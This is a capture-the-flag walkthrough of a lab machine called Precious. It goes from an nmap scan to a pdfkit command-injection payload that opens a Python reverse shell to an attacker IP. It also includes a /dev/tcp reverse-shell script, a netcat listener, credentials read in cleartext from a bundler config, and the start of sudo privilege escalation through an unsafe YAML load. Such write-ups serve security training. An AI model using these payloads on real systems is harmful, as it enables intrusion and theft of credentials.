# Overview

## Footprinting:
```
└─$ nmap -sV -A -p- 10.10.11.189            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 22:17 EDT
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds
```

## Initial foothold:
```
curl http://10.10.11.189:80/ -L
curl: (6) Could not resolve host: precious.htb
```

The attacker machine is not able to resolve the local hostname for the redirect:
```
vim /etc/hosts
10.10.11.189    precious.htb
```

The web application will process the passed URL and generate a PDF accordingly.

It can be possible to weaponize this by hosting a Python local web server and redirect the URL to the attacker's payload.

We can try to generate a reverse shell payload that will be fetched:
```
vim payload.sh

sh -i >& /dev/tcp/10.10.14.39/1234 0>&1
```

If the payload gets executed, we need to setup a listener on the attacker machine:
```
nc -nvlp 1234
```

Finally, we can host this payload with a local Python web server:
```
python -m http.server 8000
```

On the target, we can provide the following URL:
```
http://10.10.14.39:8000/payload.sh
```

The local web server receives the connection, but no reverse shell is established:
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.189 - - [11/May/2023 13:28:38] "GET /payload.sh HTTP/1.1" 200 -
```

The web application generates a PDF containing the content of the file downloaded. If we check the content of the PDF, we can get more information about the pdfkit software used:
```
 cat yncynx8ds9if3xihyzzej7dfvjsojktg.pdf
 
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
   </rdf:Seq>
  </dc:creator>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

The version used is affected by a command injection vulnerability:
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

The original attack vector can now be replaced with directly launching a reverse shell from the target to the attacker machine. We can generate a payload to exploit the flaw in the web application:
```
http://example.com/?name=#{'%20`export RHOST="10.10.14.39";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`'}
```

The connection is set on the receiver:
```
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.11.189] 39274
$ whoami
ruby
```

Upgrading the basic shell to be interactive:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege escalation:

Now that we have access to the ruby user, we need to elevate our privileges:
```
bash-5.1$ cd /home/ruby

bash-5.1$ ls -la

total 32
drwxr-xr-x 5 ruby ruby 4096 May 11 08:21 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 4 ruby ruby 4096 May 11 01:00 .cache
drwxr-xr-x 3 ruby ruby 4096 May 11 08:21 .local
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

We have the password in clear text for the user henry:
```
bash-5.1$ cd .bundle

bash-5.1$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

bash-5.1$ su henry 
Password: Q3c1AqGHtoI0aXAYFH

bash-5.1$ whoami
henry

bash-5.1$ cd /home/henry

bash-5.1$ cat user.txt
b7da17f8f92a7e02a6b4489d3433f7b1
```

By checking the sudo permissions for the user henry, we can see he is able to launch an elevated command from the ruby binary by passing a script as an argument without root password:
```
bash-5.1$ sudo -l

Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

By looking at the script, we can see that it will load a YAML file that we can provide:
```rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```